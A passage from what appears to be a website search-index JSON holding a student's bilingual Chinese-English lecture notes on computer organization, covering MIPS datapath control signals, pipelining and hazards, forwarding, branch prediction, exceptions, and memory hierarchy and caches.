\u6bcf\u4e2a\u591a\u8fdb\u4e00\u7684\u5730\u65b9\u90fd\u8981\u7528mux</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#control-unit","title":"control unit","text":"<p>control center \u4f1a\u6839\u636e\u6307\u4ee4\u7684\u7c7b\u578b\u8fdb\u884c\u8bd1\u7801\uff0c\u9009\u62e9\u63a7\u5236\u4fe1\u53f7\uff0c\u63a7\u5236\u662f\u5426\u80fd\u5199\u80fd\u8bfb\uff08\u5bc4\u5b58\u5668\u53ea\u6709\u5199\u7684\u4fe1\u53f7\uff0c\u4e3b\u5b58\u6709\u8bfb\u548c\u5199\u7684\u4fe1\u53f7\uff09\u548c\u591a\u8def\u9009\u62e9\u5668 \u4ee5\u53caALU operation (ALU \u9009\u62e9\u54ea\u4e2a\u529f\u80fd)</p> <p>\u7b2c\u4e00\u5f20\u8f83\u4e3a\u5b8c\u6574\u7684data path \u5728 22</p> <p>ALU control</p> <p>lw\u6307\u4ee4 -&gt; add</p> <p>branch -&gt; subtract</p> <p>r-type instruction depends on the funct field can see the 23 24 in PPT</p> <p>\u63a7\u5236\u4fe1\u53f7\u8868</p> <p>RegDst \u5bc4\u5b58\u5668\u76ee\u6807\u9009\u62e9</p> <p>RegWrite \u662f\u5426\u5199\u5bc4\u5b58\u5668</p> <p>ALUSrc \u7b2c\u4e8c\u4e2a\u8ba1\u7b97\u6570\u9009\u62e9</p> <p>PCSrc  PC\u662f\u8ba1\u7b97\u7ed3\u679c\u8fd8\u662f\u76f4\u63a5\u52a0\u56db\uff08Branch</p> <p>MemRead</p> <p>MemWrite</p> <p>MemToReg  \u5199\u5165\u5bc4\u5b58\u5668\u7684\u6570\u636e\u662f\u6765\u81ea\u5185\u5b58\u8fd8\u662fALU\uff0c\u82e5\u4e3a1\u662f\u6765\u81ea\u5185\u5b58</p> <p>ALUop ALU\u7684\u9009\u62e9</p> <p>Jump  PC\u662f\u9009\u62e9Branch\u7684\u7ed3\u679c\u8fd8\u662fjump\u7684\u7ed3\u679c</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#pipelining-analogy","title":"pipelining analogy","text":"<p>\u5355\u5468\u671f\u7684\u95ee\u9898\u5728\u4e8elongest delay determines clock period</p> <p>pipeline \u5c06\u4e00\u6761\u6307\u4ee4\u5212\u5206\u6210\u4e94\u4e2a\u9636\u6bb5</p> <p>IF\u8bfb\u6307\u4ee4 ID\u8bd1\u7801(\u540c\u65f6\u53ef\u4ee5\u8bfb\u5bc4\u5b58\u5668) EX\u6267\u884c MEM\u8bbf\u95ee\u5185\u5b58 WB\u5199\u56de\u5bc4\u5b58\u5668</p> <p>jump\u6307\u4ee4\u5728EX\u9636\u6bb5\u8ba1\u7b97\u51fa\u8981\u8df3\u8f6c\u7684PC\u7684\u503c</p> <p>pipeline performance</p> <p>speedup=\u539f\u65f6\u95f4/\u4f18\u5316\u540e\u7684\u65f6\u95f4</p> <p>\u6d41\u6c34\u7ebf\u7684\u5f00\u59cb\u548c\u7ed3\u5c3e\u5b58\u5728\u7a7a\u7f6e\u65f6\u95f4\uff0c\u56e0\u6b64\u65e0\u6cd5\u505a\u5230\u5b8c\u5168\u7684\u4f18\u5316\u4e3aspeedup=\u9636\u6bb5\u6570</p> <p>\u7406\u8bba\u4e0aspeedup \u662f5\uff0c\u4f46\u56e0\u4e3a\u6307\u4ee4\u4e0e\u6307\u4ee4\u4e4b\u95f4\u6267\u884c\u7684\u65f6\u95f4\u4e0d\u540c\uff08\u5c24\u5176\u662fmemory access\u662f\u5728\u7f13\u5b58\u8fd8\u662f\u5185\u5b58\uff0c\u786c\u76d8</p> <p>\u5bf9\u4e8e\u5355\u5468\u671f\u800c\u8a00\uff0c\u65f6\u949f\u5468\u671f\u8bbe\u8ba1\u4e3a\u6240\u6709\u6307\u4ee4\u4e2d\u6267\u884c\u65f6\u95f4\u6700\u957f\u7684\u4e00\u6761 \u6d41\u6c34\u7ebf\u4e2d \u6bcf\u4e2a\u9636\u6bb5\u7684\u65f6\u95f4\u90fd\u8981\u53c2\u7167\u6700\u957f\u7684\u9636\u6bb5\u65f6\u95f4\u8bbe\u7f6e\uff0c\u65f6\u949f\u5468\u671f\u662f\u6307\u4ee4\u9636\u6bb5\u4e2d\u8017\u65f6\u6700\u957f\u9636\u6bb5\u7684\u65f6\u95f4</p> <p>\u7406\u60f3\u5316\u6761\u4ef6\u4e0b  time between instructions = time of nopipeline / number of stages</p> <p>speedup due to increased throughput</p> <p>\u7f13\u5b58\u5206\u4e3a\u6307\u4ee4cache\u548c\u6570\u636ecache\uff0c\u5728MIPS\u6307\u4ee4\u4e2d\u6700\u5bb9\u6613\u4f7f\u5f97\u6d41\u6c34\u7ebf\u7a7a\u8f6c\u7684\u662f\u5185\u5b58\u8bbf\u95ee\u6307\u4ee4</p> <p>hazards</p> <p>structure hazards, data hazarads, control hazards</p> <p>For structure hazards, load and store can not pipeline ??</p> <p>data hazards \u8fd9\u4e00\u6b65\u8981\u7528\u7684\u6570\u636e\u9700\u8981\u7b49\u5f85\u524d\u51e0\u6b65\u7684\u7ed3\u679c</p> <p>\u53ef\u4ee5\u9009\u62e9bubble\u6765\u7a7a\u8f6c\uff0c\u4f46\u66f4\u597d\u7684\u505a\u6cd5\u662f\u7528forward</p> <p>\u200b\u200b</p> <p>\u4f46\u5982\u679c\u9700\u8981\u7684\u6570\u636e\u6765\u81ea\u4e8e\u524d\u4e00\u6761\u7684mem\u9636\u6bb5\uff0c\u5219\u9700\u8981bubble\u4e00\u6b21\u5728forward</p> <p>\u200b\u200b</p> <p>branch hazards</p> <p>\u9700\u8981\u7b49\u5f85branch\u7684\u7ed3\u679c\u53bb\u83b7\u5f97\u6307\u4ee4</p> <p>ID\u9636\u6bb5\u5df2\u7ecf\u8ba1\u7b97\u4e86branch\u6307\u4ee4\u7684\u503c\uff01</p> <p>pipeline register, it needs registers between stages to hold the information produced in previcous cycle</p> <p>the control line group\u4e0d\u540c\u9636\u6bb5\u7684\u4fe1\u53f7\u5206\u914d</p> <p>EX\u9636\u6bb5 regeDst ALUOp ALUSrc\uff0c Memory access\u9636\u6bb5 branch memread memwrite,</p> <p>write back \u9636\u6bb5 memToreg RegWrite</p> <p>\u5982\u4f55\u53bbdetect the need to forward</p> <p>P75 impoortant!!!!</p> <p>stalls reduce perfomance. Compiler can arrange the code to avoid hazards and stalls</p> <p>branch delay : \u7531branch hazard\u5e26\u6765\u7684\u5ef6\u8fdf</p> <p>\u89e3\u51b3\u65b9\u6cd5</p> <ol> <li>compute the target address early</li> <li>evaluate the branch decision(harder</li> </ol> <p>One solution, we can design a unit in ID stage to judge whether equal. But if there is data hazards for two number to compare, we still need to stall.</p> <p>\u6709forward\u5e2e\u52a9\u7684\u60c5\u51b5\u4e0b</p> <p>\u5f53\u524d\u4ec5\u5f53\u6b63\u597dbeq\u7684\u64cd\u4f5c\u6570\u4e3a\u524d\u9762\u90a3\u6761\u8ba1\u7b97\u6307\u4ee4\u7684\u7ed3\u679c\u65f6\uff0c\u9700\u8981\u4e00\u4e2astall cycle \u82e5\u524d\u4e00\u6761\u6307\u4ee4\u4e3alw\u6307\u4ee4\uff0c\u5219\u9700\u8981\u4e24\u4e2astall cycle</p> <p>dynamic branch prediction\uff1a in deeper and superscalar pipelines, branch penalty is more significant.</p> <ul> <li>\u5ef6\u8fdf\u5206\u652f\uff1a\u628a\u524d\u9762\u4e0e\u5206\u652f\u65e0\u5173\u7684\u6307\u4ee4\u653e\u5230\u5206\u652f\u6307\u4ee4\u540e\u9762\u6267\u884c\uff1f</li> <li>branch prediction buffer\u7528\u6765\u5b58\u50a8\u76f8\u5173\u6570\u636e\uff0c\u4f5c\u4e3a\u9884\u6d4b\u4f9d\u636e\uff08branch history table</li> <li>indexed by recent branch instruction address</li> <li>store the result</li> <li> <p>to execute a branch</p> </li> <li> <p>check the table, expect the same outcome</p> </li> <li>start fetching</li> <li>if wrong, flush pipeline and flip prediction</li> </ul> <p>example:</p> <p>1-bit predictor: follow the last result.</p> <ul> <li>inner loop branch mispredicted twice, in the last iteration and \u4e0b\u4e00\u6b21\u5faa\u73af\u7684the first iteration</li> </ul> <p>2-bit predictor: only change the prediction on two successive mispredictions</p> <p>\u200b\u200b</p> <p>branch target buffer\uff1a \u7528\u6765\u8bb0\u5f55\u4ee5\u524d\u66fe\u7ecf\u8df3\u8f6c\u8fc7\u7684\u76ee\u6807\u5730\u5740</p> <ul> <li>cache of target addresses</li> <li>indexed by PC when instruction fetched</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#logic-design","title":"logic design","text":"<p>one wire per bit</p> <p>\u603b\u7ebf\u8fde\u63a5\u548c\u5206\u6563\u8fde\u63a5</p> <p>\u6570\u636e\u901a\u8def\u662f\u64cd\u4f5c\u90e8\u4ef6\u548c\u5b58\u50a8\u90e8\u4ef6\u4ee5\u603b\u7ebf\u6216\u8005\u5206\u6563\u5f62\u5f0f\u8fde\u63a5\u8d77\u6765\u7684\u5b58\u50a8\uff0c\u5904\u7406\uff0c\u4f20\u9001\u7684\u8def\u5f84</p> <p>combinational elements</p> <p>\u4e00\u7cfb\u5217\u7ec4\u5408\u5143\u4ef6</p> <p>sequential elements</p> <p>clock signal to determine when to update the stored value</p> <p>update when CLK changes from 0 to 1</p> <p>\u524d\u540e\u6709\u4fdd\u6301\u65f6\u95f4\u548c\u5efa\u7acb\u65f6\u95f4</p> <p>when the write signal is 1, it will update</p> <p>cycle time = latch prop + longest delay path + setup + clock skew</p> <p>data path</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#pipelining-analogy_1","title":"pipelining analogy","text":""},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#hazards","title":"hazards","text":"<p>Hazards can be divided into structure hazards, data hazard and control hazard.</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#structural-hazard","title":"structural hazard","text":"<p>pipelined datapath require separate instruction/data memories.  \u8ba9\u53d6\u6307\u4ee4\u548c\u8bbf\u95ee\u5185\u5b58\u53ef\u4ee5\u5e76\u884c</p> <p>would cause a pipeline \"bubble\" \u5f53\u6d41\u6c34\u7ebf\u51fa\u73b0\u95ee\u9898\u65f6</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#data-hazard","title":"data hazard","text":"<pre><code>add s0,t0,t1\nsub t2,s0,t3\n</code></pre> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u6307\u4ee4\u800c\u8a00\uff0csub\u7684s0\u9700\u8981\u7b49\u5f85\u4e0a\u4e00\u6761\u6307\u4ee4\u7684\u7ed3\u679c\uff0c\u56e0\u6b64\u8981\u5728\u6d41\u6c34\u7ebf\u4e2d\u52a0bubble\uff0c\u76f4\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u8bfb\u5bc4\u5b58\u5668\u9636\u6bb5\u8981\u5728\u4e0a\u4e00\u6761\u6307\u4ee4\u7684\u5199\u5165\u5bc4\u5b58\u5668\u9636\u6bb5\u4e4b\u524d\uff0c\u4f46\u662f\u7531\u4e8eWB\u9636\u6bb5\u7684\u5199\u5165\u5bc4\u5b58\u5668\u5728\u6d41\u6c34\u7ebf\u9636\u6bb5\u7684\u524d\u534a\u90e8\u5206\uff0cID\u7684\u8bfb\u5bc4\u5b58\u5668\u5728\u6d41\u6c34\u7ebf\u9636\u6bb5\u7684\u540e\u534a\u90e8\u5206\uff0c\u56e0\u6b64\u53ef\u4ee5\u653e\u5728\u4e00\u5757</p> <p>forward \uff08bypassing)</p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u7684\u6570\u636e\u5192\u9669\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7forward\u89e3\u51b3\uff0c\u901a\u8fc7\u628aEX\u6267\u884c\u9636\u6bb5\u5b8c\u4e4b\u540e\u7684\u7ed3\u679c\u76f4\u63a5\u4ea4\u7ed9\u6d41\u6c34\u7ebf\u7684\u4e0b\u4e00\u6761\u6307\u4ee4</p> <p>\u4f46forward\u4e0d\u80fd\u89e3\u51b3\u6240\u6709data hazard \u6bd4\u5982\u6709\u4e9b\u6307\u4ee4\u7528\u5230\u7684\u6570\u636e\uff0c\u5f97\u7b49\u5230\u5185\u5b58\u8bbf\u95ee\u9636\u6bb5\u4e4b\u540e\u624d\u5b58\u5728</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#pipeline-control","title":"pipeline control","text":"<p>\u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668\u4e0d\u9700\u8981\u7ed9\u51fa\u5199\u4fe1\u53f7\uff0c\u5199\u5165\u662f\u56fa\u5b9a\u7684</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#detecting-the-need-to-forward","title":"detecting the need to forward","text":"<p>\u68c0\u67e5</p> <p>ID/EX.registerRs=EX/MEM.registerRd   //IDEX \u9636\u6bb5\u8981\u7528\u7684\u5bc4\u5b58\u5668\u4e0eEXMEM\u9636\u6bb5\u8981\u5199\u7684\u5bc4\u5b58\u5668\u662f\u5426\u4e00\u6837</p> <p>ID/EX.registerRt=EX/MEM.registerRd</p> <p>MEM/EB.registerRd=ID/EX.registerRs  //IDEX \u9636\u6bb5\u8981\u7528\u7684\u5bc4\u5b58\u5668\u662f\u5426\u4e0eMEMWB\u9636\u6bb5\u8981\u5199\u7684\u5bc4\u5b58\u5668\u4e00\u6837</p> <p>MEM/EB.registerRd=ID/EX.registerRt</p> <p>\u53ea\u6709\u5199\u5bc4\u5b58\u5668\u7684\u6307\u4ee4\u624d\u4f1a\u89e6\u53d1forward, \u5e76\u4e14 rd \u9700\u8981\u5408\u6cd5\uff0c\u4f8b\u5982\u8981\u5199\u5165\\(zero \u5b9e\u9645\u5230\u6700\u540e\u662f\u5199\u4e0d\u8fdb\u53bb\u7684\uff0c\u4f46\u662f\u53ef\u80fd\u5f53\u4e0b\u4e00\u6761\u6307\u4ee4\u4e5f\u7528\\)zero \u65f6\uff0c\u4f1a\u89e6\u53d1\u65c1\u8def \u8fd9\u4e9b\u4e5f\u662f\u7535\u8def\u8bbe\u8ba1\u8003\u8651\u7684\u4e8b\u60c5</p> <p>\u540c\u65f6\u89e6\u53d1\u4e0a\u8ff0\u4e24\u79cdforward\u65f6\uff0c\u9009\u62e9\u6700\u65b0\u7684\u4e00\u4e2a\uff08EX/MEM\u4f18\u5148</p> <p>We have a forwarding unit to control it</p> <p>\u5bf9\u4e8eload-use\u6307\u4ee4\u4ea7\u751f\u7684data hazard\uff0c\u6709\u7684\u65f6\u5019forward\u662f\u4e0d\u80fd\u89e3\u51b3\u7684\uff0c\u56e0\u4e3a\u65f6\u95f4\u6765\u4e0d\u53ca</p> <p>\u5982\u4f55\u53bb\u505c\u987f\u6d41\u6c34\u7ebf</p> <ul> <li>control ID/EX register to 0. EX, MEM, WB do nop</li> <li>prevent upate of PC and IF/ID register</li> </ul> <p>\u9664\u4e86\u901a\u8fc7\u786c\u4ef6\u7684\u63a7\u5236\u4fe1\u53f7\u6765\u5904\u7406\u6570\u636e\u5192\u9669\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8f6f\u4ef6\u7f16\u8bd1\u7684\u65b9\u5f0f\u5904\u7406</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#exception-and-interruption","title":"exception and interruption","text":"<p>unexpected event requires change in flow of control</p> <ul> <li>Exception like undefined opcode, overflow, syscall.</li> <li>Interruption like IO</li> </ul> <p>In MIPS, exceptions managed by a System control coprocessor(CP0)</p> <ul> <li>Save the PC in exception program counter(EPC</li> <li>Save the indication of the problem in the cause register</li> <li>transfer to relevant handler  8000 0180</li> <li>judge whether continue</li> </ul> <p>Alternate vectored interrpt(\u5c06\u4e0d\u540c\u7684\u9519\u8bef\u6620\u5c04\u5230\u4e0d\u540c\u7684\u5730\u5740)</p> <p>example</p> <ul> <li>undefined opcode 8000 0000</li> <li>overflow                 8000 0180</li> <li>and so on</li> </ul> <p>exception is one kind of control hazard</p> <p>handler action:</p> <ul> <li>read cause and transfer to relevant handler</li> <li>determine action required</li> <li>\u5224\u65ad\u662f\u5426restartable \u5982\u679c\u53ef\u4ee5\uff0c\u5c31\u7528EPC\u56de\u5230\u7a0b\u5e8f</li> <li>\u5426\u5219\u5c31\u7ec8\u6b62\u7a0b\u5e8f\uff0c\u6216\u8005\u7528EPC\u62a5\u9519</li> </ul> <p>\u53d1\u751f\u5f02\u5e38\u540e\uff0c\u5148\u5b8c\u6210\u524d\u9762\u7684\u90a3\u4e9b\u6307\u4ee4\uff0c\u6e05\u7a7a\u8be5\u6307\u4ee4\u7684\u4e94\u4e2a\u9636\u6bb5\u7684\u540e\u9762\u51e0\u4e2a\uff08\u5305\u62ec\u6d41\u6c34\u7ebf\u4e2d\u7684\u5176\u4ed6\u6307\u4ee4</p> <p>Flush\u4fe1\u53f7\uff0c\u6e05\u7a7a\u5f53\u65f6CPU\u6240\u6709\u9636\u6bb5\uff0c\u51c6\u5907\u8bfb\u5165\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u4f8b\u5982EX\u9636\u6bb5\u53d1\u751f\u5f02\u5e38\uff0c\u8be5\u6307\u4ee4\u548c\u540e\u9762\u4e24\u4e2a\u6307\u4ee4</p> <p>multiple exception</p> <p>\u5148\u5904\u7406\u7b2c\u4e00\u4e2a\uff0c\u770b\u80fd\u5426\u7ee7\u7eed\uff0c\u82e5\u80fd\u7ee7\u7eed\u5219\u518d\u8fdb\u884c\u5904\u7406</p> <p>imprecise exception</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#instruction-level-parallelism","title":"instruction-level parallelism","text":"<p>static scheduling--------\u7f16\u8bd1\u5668</p> <p>dynamic scheduling-----\u786c\u4ef6</p> <p>\u5982\u4f55\u63d0\u9ad8\u6d41\u6c34\u7ebf\u6027\u80fd</p> <ul> <li>deeper pipeline</li> <li>multiple issue   CPI and IPC(\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u591a\u5c11\u4e2a\u6307\u4ee4)   static multiple issue : \u7f16\u8bd1\u5668</li> </ul> <p>speculation \u9884\u6d4b</p> <p>two-issue \u4e00\u6b21\u6267\u884c\u4e24\u6761\u6307\u4ee4\uff08\u4e00\u6761\u662fALU/branch \u4e00\u6761\u662f\u5185\u5b58\uff0c\u5e76\u4e14\u4e0d\u80fd\u6709\u76f8\u5173\u6027\uff09</p> <p>loop unrolling</p> <p>\u7f16\u8bd1\u5668\u5c55\u5f00\u5faa\u73af\uff0c\u4f8b\u5982\u8981\u505a32\u6b21\u5faa\u73af\uff0c\u73b0\u5728\u4e00\u6b21\u505a4\u4e2a\u5faa\u73af\uff0c4\u4e2a\u5faa\u73af\u4e2d\u5305\u542b\u66f4\u591a\u7684\u6307\u4ee4\uff0c\u6211\u4eec\u5c31\u80fd\u5b9e\u73b0\u66f4\u591a\u7684\u5e76\u884c</p> <p>\u5faa\u73af\u5c55\u5f00\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8fd8\u4f1a\u8fdb\u884cregister rename \u5bf9\u4e8e\u90a3\u4e9b\u5047\u76f8\u5173\u7684\u6307\u4ee4\uff0c\u5206\u914d\u5230\u5176\u4ed6\u5bc4\u5b58\u5668\u91cc\u9762</p> <p>**dynamic multiple issue **</p> <p>\u4e00\u6b21\u591a\u53d1\u9001\u51e0\u6761\u6307\u4ee4</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_8","title":"\u5b58\u50a8\u5668","text":"<p>principle of locality:</p> <ul> <li>temporal locality \u6700\u8fd1\u8bbf\u95ee\u8fc7\u7684\u6570\u636e\u53ef\u80fd\u5f88\u5feb\u8981\u88ab\u518d\u6b21\u8bbf\u95ee</li> <li>spatial locality     \u88ab\u8bbf\u95ee\u8fc7\u7684\u6570\u636e\u7684\u5468\u8fb9\u7684\u6570\u636e\u53ef\u80fd\u5f88\u5feb\u5c06\u88ab\u8bbf\u95ee</li> </ul> <p>memory hierarchy levels</p> <ul> <li>hit : we can find the memory staisfied in upper level</li> <li> <p>miss: we can't find the memory staisfied, we need to do the block copies.   and the time will be taken( miss penalty</p> </li> <li> <p>SRAM \u9759\u6001 0.5ns-2.5ns</p> </li> <li>DRAM \u52a8\u6001 \u4e3b\u5b58  50ns-70ns</li> <li>Magnetic disk  \u78c1\u76d8  5ms-20ms</li> <li>ideal memory   SRAM\u7684\u8bbf\u95ee\u901f\u5ea6\uff0cdisk\u7684\u5bb9\u91cf\u548c\u4ef7\u683c</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#storage","title":"\u5404\u79cdstorage\u4ecb\u8d28\u7684\u7279\u70b9","text":"<p>DRAM main memory</p> <ul> <li>data stored as a charge in a capacitor</li> <li>must be periodically be refreshed</li> </ul> <p>main memory \u7684\u4e3b\u8981\u6307\u6807</p> <ul> <li>\u5bb9\u91cf</li> <li>\u5b58\u53d6\u65f6\u95f4</li> <li>\u5b58\u50a8\u5468\u671f \u8fde\u7eed\u4e24\u6b21\u8bbf\u5b58\u6240\u9700\u7684\u6700\u5c0f\u65f6\u95f4\u95f4\u9694\uff0c\u4f1a\u5927\u4e8e\u5b58\u53d6\u65f6\u95f4\u662f\u56e0\u4e3a\u5b58\u53d6\u4e00\u6b21\u540e\u7535\u8def\u6709\u4e00\u6bb5\u7a33\u5b9a\u6062\u590d\u65f6\u95f4</li> <li>row buffer \u5141\u8bb8several words be read and refreshed in parallel</li> <li>**synchronous DRAM ** \u5141\u8bb8\u8fde\u7eed\u8bbf\u95ee\uff0c\u4e0d\u5fc5\u53d1\u9001\u6bcf\u4e2a\u5730\u5740 \u53ef\u4ee5\u4e00\u6b21\u83b7\u53d6\u4e00\u5757\u5185\u5b58can improve bandwidth</li> <li>DRAM banking  \u5141\u8bb8\u540c\u65f6\u8bbf\u95ee\u591a\u4e2a\u5185\u5b58\uff0ccan improve bandwith</li> </ul> <p>flash storage</p> <ul> <li>\u5feb\u4e8edisk\uff0c\u5bb9\u91cf\u4ecb\u4e8e\u5185\u5b58\u548cdisk\u4e4b\u95f4</li> <li>\u5206\u4e3aNOR flash \u548c NAND flash</li> <li>\u7279\u70b9\u662fflash bits wear out after 100 000 of accesses, \u6240\u4ee5\u5176\u5728\u957f\u65f6\u95f4\u4f7f\u7528\u540e\u5bb9\u91cf\u4f1a\u7f29\u5c0f</li> <li>nonvolatile  \u4e0d\u6613\u5931</li> </ul> <p>disk storage</p> <ul> <li>nonvolatile \u4e0d\u6613\u5931</li> <li>rotating magentic storage</li> <li>\u78c1\u76d8\u8868\u9762\u88ab\u5206\u6210\u5f88\u591a\u540c\u5fc3\u5706\uff0c\u6bcf\u4e2a\u540c\u5fc3\u5706\u90fd\u662f\u4e00\u4e2atrack\uff0c\u6bcf\u4e2a\u78c1\u9053\u90fd\u88ab\u5206\u6210\u82e5\u5e72\u4e2a\u6247\u533asector \u73b0\u5728\u4e00\u822c\u662f4096bits\u4e00\u4e2a\u6247\u533a</li> </ul> <p>cylinder : </p> <p>access to sector involves</p> <p>queuing delay  (\u7535\u68af\uff0c\u6309\u7167\u8bbf\u95ee\u7684\u78c1\u9053\u8fdb\u884c\u6392\u5e8f\uff0c\u90fd\u662f\u987a\u7684\u5148\u7ed9\u51fa\u8bbf\u95ee\uff0c\u5c31\u50cf\u7535\u68af\u5148\u89e3\u51b3\u6cbf\u9014\u6240\u6709\u5411\u4e0a\u7684\u9700\u6c42</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#example","title":"example","text":"<p>512B sector, 15000rpm(\u4e00\u5206\u949f\u591a\u5c11\u8f6c) 4ms average seek time(\u5e73\u5747\u5bfb\u9053\u65f6\u95f4\uff0c\u4ece\u6700\u5916\u5708\u5230\u6700\u5185\u5708\u7684\u65f6\u95f4/2\uff09100MB/s\u7684transfer rate  0.2ms\u7684controller overhead. Assume the idle disk ()</p> <p>ans:= 4ms + 1/2/(15000/60) + 512 / 100 + 0.2 = 6.2ms</p> <p>ans:= \u5e73\u5747\u5bfb\u9053\u65f6\u95f4 + \u5e73\u5747\u627e\u5230sector\u7684\u65f6\u95f4\uff08\u8f6c\u534a\u5708\u7684\u65f6\u95f4\uff09+ \u4f20\u8f93\u65f6\u95f4(\u4f20\u8f93\u5bb9\u91cf / \u4f20\u8f93\u6548\u7387) + controller delay</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#dma","title":"DMA","text":"<p>\u78c1\u76d8\u63a7\u5236\u5668\u8fde\u63a5\u5728IO\u603b\u7ebf\u4e0a\uff0cIO\u603b\u7ebf\u4e0e\u5176\u4ed6\u603b\u7ebf\u4e4b\u95f4\u7528\u6865\u63a5\u5668\u8fde\u63a5</p> <p>\u91c7\u7528dma\u7684\u65b9\u5f0f\uff08\u76f4\u63a5\u5b58\u50a8\u5668\u5b58\u53d6\uff09\u8fdb\u884c\u6570\u636e\u7684\u8f93\u5165\u8f93\u51fa\uff0c\u6709\u4e00\u4e2a\u4e13\u95e8\u7684\u63a7\u5236\u5668\u6765\u63a7\u5236\uff0c\u6709\u4e13\u95e8DMA\u63a5\u53e3\u6765\u63a7\u5236\u5916\u8bbe\u548c\u4e3b\u5b58\u4e4b\u95f4\u76f4\u63a5\u6570\u636e\u4ea4\u6362</p> <p>disk performance issues P19</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#cache-memory","title":"cache memory","text":"<p>cache hierarchy closest to CPU\uff0c\u57fa\u672c\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5c31\u591f\u4e86\uff0c\u5bc4\u5b58\u5668\u7684\u8bdd\u534a\u4e2a\u5c31\u591f\u4e86</p> <p>\u5bb9\u91cf\u5927\u6982\u5728\u51e0\u4e2ak\u5230\u51e0\u4e2am\u4e4b\u95f4\uff0c\u5212\u5206\u4e3a\u51e0\u4e2ablock\uff0c\u6bcf\u4e2ablock\u5927\u6982\u662f\u51e0\u4e2aword\u7684\u5bb9\u91cf</p> <p>\u6bcf\u4e00\u6b21\u8bfb\u5185\u5b58\uff0c\u90fd\u4f1a\u628a\u5b83\u53ca\u5176\u5468\u8fb9\u5185\u5bb9\u653e\u5230cache\u91cc</p> <ul> <li> <p>How can I check whether it is in cache</p> </li> <li> <p>Where we can find it</p> </li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#direct-map-cache","title":"direct map cache","text":"<p>\u7528\u5b9e\u9645\u5730\u5740\u7684\u4f4e\u5730\u5740\u53bb\u7f16\u53f7cache\uff0c\u6bd4\u59820001\u7684\u5185\u5b58\u653e\u523001\u7684cache\u91cc\uff0c1001\u4e5f\u653e\u572801\u7684cache\u91cc</p> <p>01\u8fd9\u4e2aindex\u662f\u6839\u636e\u7f13\u5b58\u7684\u4f4d\u7f6e\u4ea7\u751f\u7684\uff0c\u5e76\u4e0d\u5b58\u5728\u5b9e\u9645\u7684\u6570\u636e\u5b58\u50a8</p> <ul> <li>block address modulo blocks in cache</li> </ul> <p>tags and valid bits</p> <p>\u6211\u4eec\u7528tags\uff0c\u6765\u5b58\u50a8\u5b9e\u9645\u5730\u5740\u7684\u9ad8\u4f4d\uff0c\u6765\u5224\u65ad\u8fd9\u4e2a\u5bf9\u5e94cache\u662f\u5426\u5c31\u662f\u6211\u4eec\u6240\u9700\u5730\u5740\u7684\u6570\u636e</p> <p>valid bits \u7528\u6765\u8bf4\u660e\u8fd9\u4e2acache\u91cc\u662f\u5426\u786e\u5b9e\u6709\u6570\u636e\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u6216\u8005\u4e0d\u662f\u6211\u4eec\u9700\u8981\u7684\u6570\u636e\uff0c\u5c31\u66ff\u6362</p> <p>\u7f13\u5b58\u653e4k\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5b9e\u9645\u5360\u7684\u7a7a\u95f4\u4f1a\u66f4\u591a\u4e00\u70b9</p> <ul> <li>example</li> </ul> <p>the cache size is 2 ^ n blocks, n bits are used for the index.</p> <p>the block size is 2 ^ m words\uff08mips\u4e2d\u4e00\u4e2aword\u662f32bits\uff09, m bits are used for word in block, and two bits are used for the byte part of the address.</p> <p>tag \u6807\u8bb0\u5b57\u6bb5\u7684\u5927\u5c0f\u4e3a32-n-m-2  \u4e00\u822cm\u662f0  \u672b\u5c3e\u7aef\u662f00\uff0c\u6240\u4ee5\u90a3\u4e24\u4f4d\u4e0d\u7528\u52a0 \u5982\u679c\u4e00\u4e2ablock\u5360\u591a\u4e2a\u6570\u636e\uff0c\u4f8b\u59822 ^ m \u4e2a \u6211\u4eec\u53ef\u4ee5\u5c11\u8bb0\u5f55m\u4f4d</p> <p>offset \u4e3a m+2 bit</p> <p>index \u4e3a n bits</p> <p>\u76f4\u63a5\u6620\u5c04cache\u7684\u603b\u4f4d\u6570\u662f 2^n^\u200b (32*2^m^ + 32-m-n-2 +1)</p> <ul> <li>example larger block size</li> </ul> <p>64blocks and 16bytes a block, the address is 